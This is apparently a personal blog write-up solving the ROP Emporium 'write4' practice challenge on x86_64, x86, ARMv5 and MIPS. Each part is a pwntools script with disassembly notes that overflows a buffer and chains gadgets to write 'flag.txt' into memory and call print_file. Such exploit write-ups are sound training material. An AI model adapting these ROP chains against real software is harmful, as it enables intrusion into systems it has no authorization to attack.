--- 
layout: post 
title:  "[ROP EMPORIUM] write4"
date: "2021-05-10" 
tags: [pwn, rop, ROP-EMPORIUM] 
---


This is the fourth challenge of rop emporium. In this challenge we have a function named print_file() in order to win we need to call it with the name of a file that we wish to read as the 1st argument. But here we don't have the string 'flag.txt' inside the binary. We need to find a way to write this string inside the memory of the program and then use it calling the function print_file().

# x86_64 (64 bit) architecture

inside the script there are all the information needed. in this case we need to find a gadget that permit to write something into the memory of the program, something like this ``` mov [reg], reg ```.

Initially i was thinking about write the string 'flag.txt' at where was placed the str.nonexixtent. But this tring is placed in a section of the binary (.rodata) where we cannot write anything. So i decided to write the strin 'flag.txt' into the data section.



```python
from pwn import *
context.binary = elf = ELF('./write4')
'''
pop_r14_r15
0x00400690               415e  pop r14
0x00400692               415f  pop r15
0x00400694                 c3  ret

;-- usefulGadgets:
0x00400628      4d893e         mov qword [r14], r15
0x0040062b      c3             ret

pop_rdi
0x00400693                 5f  pop rdi
0x00400694                 c3  ret

┌ 17: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; "nonexistent"
│           0x00400620      e8ebfeffff     call sym.imp.print_file
│           0x00400625      90             nop
│           0x00400626      5d             pop rbp
└           0x00400627      c3             ret

[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent

ma con rabin2 -S write4 vedo che rodata ha permessi di sola lettura
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata

possiamo scivere solo su queste sezioni 

18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss


[0x004004f0]> s sym..plt 
[0x004004f0]> pd 20
            ; CODE XREFS from sym._init @ +0x3b, +0x4b
            ;-- section..plt:
            ;-- .plt:
       ┌┌─> 0x004004f0      ff35120b2000   push qword [0x00601008]     ; [12] -r-x section size 48 named .plt
       ╎╎   0x004004f6      ff25140b2000   jmp qword [0x00601010]      ; [0x601010:8]=0
       ╎╎   0x004004fc      0f1f4000       nop dword [rax]
       ╎╎   ; CALL XREF from main @ 0x40060b
┌ 6: sym.imp.pwnme ();
└      ╎╎   0x00400500      ff25120b2000   jmp qword [reloc.pwnme]     ; [0x601018:8]=0x400506
       ╎╎   0x00400506      6800000000     push 0
       └──< 0x0040050b      e9e0ffffff     jmp sym..plt
        ╎   ; CALL XREF from sym.usefulFunction @ 0x400620
┌ 6: sym.imp.print_file ();
└       ╎   0x00400510      ff250a0b2000   jmp qword [reloc.print_file] ; [0x601020:8]=0x400516
        ╎   0x00400516      6801000000     push 1                      ; 1
        └─< 0x0040051b      e9d0ffffff     jmp sym..plt



'''

pop_r14_r15     = 0x400690
mov_ptr_r14_r15 = 0x400628
pop_rdi         = 0x400693

where    = 0x00601028 #data
what     = unpack(b'flag.txt')
call_print_file_plt = 0x00400510

offset = 40

payload = b'A'*offset + p64(pop_r14_r15)+p64(where)+p64(what)+p64(mov_ptr_r14_r15)+p64(pop_rdi)+p64(where)+p64(call_print_file_plt)
p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
log.info(p.recvall())
```


# x86 (32 bit) architecture

Here we have an architecture at 32 bit so we cannot contain entirely the string 'flag.txt' but we need to split into two part.

```python
from pwn import *

'''
[0x080483f0]> s loc.usefulGadgets 
[0x08048543]> pd 4 
            ;-- usefulGadgets:
            0x08048543      892f           mov dword [edi], ebp
            0x08048545      c3             ret

  pop_edi_ebp
  0x080485aa                 5f  pop edi
  0x080485ab                 5d  pop ebp
  0x080485ac                 c3  ret


[0x08048543]> s sym.usefulFunction 
[0x0804852a]> pdf
┌ 25: sym.usefulFunction ();
│           0x0804852a      55             push ebp
│           0x0804852b      89e5           mov ebp, esp
│           0x0804852d      83ec08         sub esp, 8
│           0x08048530      83ec0c         sub esp, 0xc
│           0x08048533      68d0850408     push str.nonexistent        ; 0x80485d0 ; "nonexistent"
│           0x08048538      e893feffff     call sym.imp.print_file
│           0x0804853d      83c410         add esp, 0x10
│           0x08048540      90             nop
│           0x08048541      c9             leave
└           0x08048542      c3             ret




[0x08048543]> rabin2 -S write432
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
19  0x00000efc    0x4 0x08049efc    0x4 -rw- .init_array
20  0x00000f00    0x4 0x08049f00    0x4 -rw- .fini_array
21  0x00000f04   0xf8 0x08049f04   0xf8 -rw- .dynamic
22  0x00000ffc    0x4 0x08049ffc    0x4 -rw- .got
23  0x00001000   0x18 0x0804a000   0x18 -rw- .got.plt
24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss

[0x0804852a]> s sym..plt
[0x080483a0]> pd 20
            ; CODE XREFS from sym._init @ +0x3f, +0x4f, +0x5f
            ;-- section..plt:
            ;-- .plt:
      ┌┌┌─> 0x080483a0      ff3504a00408   push dword [0x804a004]      ; [12] -r-x section size 64 named .plt
      ╎╎╎   0x080483a6      ff2508a00408   jmp dword [0x804a008]
      ╎╎╎   0x080483ac      0000           add byte [eax], al
      ╎╎╎   0x080483ae      0000           add byte [eax], al
      ╎╎╎   ; CALL XREF from main @ 0x8048517
┌ 6: sym.imp.pwnme ();
└     ╎╎╎   0x080483b0      ff250ca00408   jmp dword [reloc.pwnme]     ; 0x804a00c
      ╎╎╎   0x080483b6      6800000000     push 0
      └───< 0x080483bb      e9e0ffffff     jmp sym..plt
       ╎╎   ; CALL XREF from entry0 @ 0x804841d
┌ 6: int sym.imp.__libc_start_main (func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end);
└      ╎╎   0x080483c0      ff2510a00408   jmp dword [reloc.__libc_start_main] ; 0x804a010
       ╎╎   0x080483c6      6808000000     push 8                      ; 8
       └──< 0x080483cb      e9d0ffffff     jmp sym..plt
        ╎   ; CALL XREF from sym.usefulFunction @ 0x8048538
┌ 6: sym.imp.print_file ();
└       ╎   0x080483d0      ff2514a00408   jmp dword [reloc.print_file] ; 0x804a014
        ╎   0x080483d6      6810000000     push 0x10                   ; 16
        └─< 0x080483db      e9c0ffffff     jmp sym..plt
            ; CALL XREF from sym._init @ 0x8048395
            ;-- section..plt.got:


'''
context.binary = elf = ELF('write432')
offset = 44
mov_ptr_edi_ebp = 0x08048543
pop_edi_ebp     = 0x080485aa
print_file      = 0x08048538

where = 0x0804a018 # data
what1 = unpack(b'flag')
what2 = unpack(b'.txt')

payload = b'a'*offset + p32(pop_edi_ebp) + p32(where) + p32(what1) + p32(mov_ptr_edi_ebp) 
payload += p32(pop_edi_ebp) + p32(where+4) + p32(what2) + p32(mov_ptr_edi_ebp)
payload += p32(print_file)+p32(where)

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
log.info(p.recvall())
```

# ARMv5 (32 bit) architecture

```python
from pwn import *
context.binary = elf = ELF('write4_armv5')

'''
[0x000104c8]> s loc.usefulGadgets 
[0x000105ec]> pd 10
┌ 8: loc.usefulGadgets ();
│           0x000105ec      003084e5       str r3, [r4]
└           0x000105f0      1880bde8       pop {r3, r4, pc}
┌ 4: fcn.000105f4 ();
└           0x000105f4      0180bde8       pop {r0, pc}

[0x000105b4]> pdf @ sym.usefulFunction 
┌ 24: sym.usefulFunction ();
│           ; var int32_t var_4h @ sp+0x4
│           0x000105d0      00482de9       push {fp, lr}
│           0x000105d4      04b08de2       add fp, var_4h
│           0x000105d8      08009fe5       ldr r0, [str.nonexistent]   ; [0x10668:4]=0x656e6f6e ; "nonexistent"
│           0x000105dc      b3ffffeb       bl sym.imp.print_file
│           0x000105e0      0000a0e1       mov r0, r0                  ; 0x10668 ; "nonexistent"
└           0x000105e4      0088bde8       pop {fp, pc}

[0x000105b4]> rabin2 -S write4_armv5
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000f00    0x4 0x00020f00    0x4 -rw- .init_array
19  0x00000f04    0x4 0x00020f04    0x4 -rw- .fini_array
20  0x00000f08   0xf8 0x00020f08   0xf8 -rw- .dynamic
21  0x00001000   0x24 0x00021000   0x24 -rw- .got
22  0x00001024    0x8 0x00021024    0x8 -rw- .data
23  0x0000102c    0x0 0x0002102c    0x4 -rw- .bss

[0x00010478]> s sym.imp.print_file 
[0x000104b0]> pdf
            ; CALL XREF from sym.usefulFunction @ 0x105dc
┌ 12: sym.imp.print_file ();
│           0x000104b0      00c68fe2       add ip, pc, 0, 12
│           0x000104b4      10ca8ce2       add ip, ip, 16, 20
│           ; DATA XREF from sym.imp.print_file @ 0x104b0
└           0x000104b8      60fbbce5       ldr pc, [ip, 0xb60]!        ; 0x21018 ; "x\x04\x01"


'''

offset = 36
str_r3_ptrr4_pop_r3_r4_pc = 0x000105ec
pop_r3_r4_pc              = 0x000105f0
pop_r0_pc                 = 0x000105f4

print_file = 0x000104b0

where = 0x00021024
what1 = unpack(b'flag')
what2 = unpack(b'.txt')

payload  = b'A'*offset 
payload += p32(pop_r3_r4_pc)              + p32(what1) + p32(where)
payload += p32(str_r3_ptrr4_pop_r3_r4_pc) + p32(what2) + p32(where+4)
payload += p32(str_r3_ptrr4_pop_r3_r4_pc) + p32(0x0)   + p32(0x0)
payload += p32(pop_r0_pc)                 + p32(where) 
payload += p32(print_file)


p = elf.process()

#p = gdb.debug(elf.path)


p.recv()
p.sendline(payload)
log.info(p.recvall())
```

# mipsel (32 bit) architecture


```python
from pwn import *
context.binary = elf = ELF('write4_mipsel')

'''
[0x004006f0]> pd 10 @ loc.usefulGadgets 
            ;-- usefulGadgets:
            0x00400930      0c00b98f       lw t9, 0xc(sp)
            0x00400934      0800a88f       lw t0, 8(sp)
            0x00400938      0400a98f       lw t1, 4(sp)
            0x0040093c      000009ad       sw t1, (t0)
            0x00400940      09f82003       jalr t9
            0x00400944      1000bd23       addi sp, sp, 0x10
            0x00400948      0800a48f       lw a0, 8(sp)
            0x0040094c      0400b98f       lw t9, 4(sp)
            0x00400950      09f82003       jalr t9
            0x00400954      00000000       nop


[0x004006f0]> pdf @ sym.usefulFunction 
┌ 84: sym.usefulFunction (int32_t arg1, int32_t arg_10h);
|           ........................................................................................
│           0x004008fc      100b4424       addiu a0, v0, 0xb10         ; 0x400b10 ; "nonexistent" ; arg1 ; str.nonexistent
│           0x00400900      4080828f       lw v0, -sym.imp.print_file(gp) ; [0x411050:4]=0x400a90 sym.imp.print_file
│           0x00400904      25c84000       move t9, v0
│           0x00400908      09f82003       jalr t9


Useful gadget---------------------------------------------
  0x00400930           0c00b98f  lw t9, 0xc(sp)
  0x00400934           0800a88f  lw t0, 8(sp)
  0x00400938           0400a98f  lw t1, 4(sp)
  0x0040093c           000009ad  sw t1, (t0)
  0x00400940           09f82003  jalr t9
  0x00400944           1000bd23  addi sp, sp, 0x10

[0x00400a90]> pd 8 @ sym.imp.print_file 
            ;-- print_file:
            0x00400a90      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
                                                                       ; [0x411020:4]=0
            0x00400a94      2578e003       move t7, ra
            0x00400a98      09f82003       jalr t9
            0x00400a9c      10001824       addiu t8, zero, 0x10
            0x00400aa0      00000000       nop
            0x00400aa4      00000000       nop
            0x00400aa8      00000000       nop
            0x00400aac      00000000       nop


[Sections]
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000ff0    0x8 0x00410ff0    0x8 -rw- .ctors
19  0x00000ff8    0x8 0x00410ff8    0x8 -rw- .dtors
20  0x00001000   0x10 0x00411000   0x10 -rw- .data
21  0x00001010    0x4 0x00411010    0x4 -rw- .rld_map
22  0x00001020   0x44 0x00411020   0x44 -rw- .got
23  0x00001064    0x4 0x00411064    0x4 -rw- .sdata
24  0x00001068    0x0 0x00411070   0x10 -rw- .bss

'''

offset = 36

where = 0x00411070
what1 = unpack(b'flag')
what2 = unpack(b'.txt')

g1 = 0x00400930
g2 = 0x00400948
plt_print_file = 0x00400a90

t9 = g1
t0 = where
t1 = what1

payload  = b'A'*offset + p32( g1 ) + p32(0x0) + p32(t1) + p32(t0) + p32(t9)

t9 = g2
t0 = where + 4
t1 = what2

payload += p32(0x0) + p32(t1) + p32(t0) + p32(t9) 

t9 = plt_print_file
a0 = where

payload += p32(0x0) + p32(t9) + p32(a0)


#p = gdb.debug(elf.path)
p = elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())

```

